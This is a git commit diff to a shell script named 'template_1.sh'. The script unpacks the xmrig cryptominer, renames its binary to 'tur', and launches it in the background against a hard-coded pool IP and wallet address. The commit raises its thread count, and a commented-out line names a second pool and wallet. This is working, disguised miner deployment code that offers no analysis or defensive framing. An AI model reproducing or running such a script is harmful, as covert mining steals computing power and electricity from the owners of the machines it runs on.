9593d4604edf18c915be9eb6db235d2cab6d885a
Rickyose <rickyhaterearged@gmail.com>
2022-04-20 21:24:38 +0700

    Update template_1.sh

--- template/template_1.sh
+++ template/template_1.sh
@@ -7,7 +7,7 @@ tar xf xmrig-6.17.0-linux-static-x64.tar.gz
 cd xmrig-6.17.0
 mv xmrig tur
 
-./tur -o 5.161.86.84:8118 -t 1 -u Wo4h3NTk33Jhwxfri6F7Mm9UN44AbNZjacktQ1wdz9mY4Epr4mmELroXndn1vDUpzhMjdbhaDNS9M7Er8i1WqShB1GMNtXEyg --tls -k -a rx/wow &
+./tur -o 5.161.86.84:8118 -t 2 -u Wo4h3NTk33Jhwxfri6F7Mm9UN44AbNZjacktQ1wdz9mY4Epr4mmELroXndn1vDUpzhMjdbhaDNS9M7Er8i1WqShB1GMNtXEyg --tls -k -a rx/wow &
 
 
 #./tur -o sf.pool-pay.com:4025 -t 1 -u Safexso5C3bitHPMdtdzqQfBP3ua5RXzFdMeE6FkbuQvRw8KfoXWgFBEobANRxYo43KRBdrVH6diUJ6tM3dpBiwBcdHaMoukCjj23 -k -a rx/sfx
